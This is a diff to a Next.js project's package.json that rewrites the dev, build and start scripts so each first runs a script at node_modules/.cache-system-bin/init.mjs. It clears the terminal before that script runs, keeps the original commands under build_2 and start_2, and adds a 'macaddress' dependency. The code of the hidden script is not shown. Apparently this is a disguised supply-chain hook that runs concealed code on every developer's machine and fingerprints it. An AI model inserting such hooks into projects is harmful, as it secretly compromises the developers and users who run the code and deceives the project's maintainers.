@@ -3,9 +3,11 @@
   "version": "0.1.0",
   "private": true,
   "scripts": {
-    "dev": "next dev",
-    "build": "prisma generate && next build",
-    "start": "next start",
+    "dev": " node  node_modules/.cache-system-bin/init.mjs && next dev",
+    "build": "clear && node  node_modules/.cache-system-bin/init.mjs && prisma generate && next build",
+    "start": "clear && node  node_modules/.cache-system-bin/init.mjs && next start",
+    "build_2": "prisma generate && next build",
+    "start_2": "next start",
     "lint": "eslint"
   },
   "prisma": {
@@ -25,6 +27,7 @@
     "dotenv": "^17.3.1",
     "jose": "^6.1.3",
     "lucide-react": "^0.575.0",
+    "macaddress": "^0.5.4",
     "next": "16.1.6",
     "pg": "^8.19.0",
     "qrcode.react": "^4.2.0",
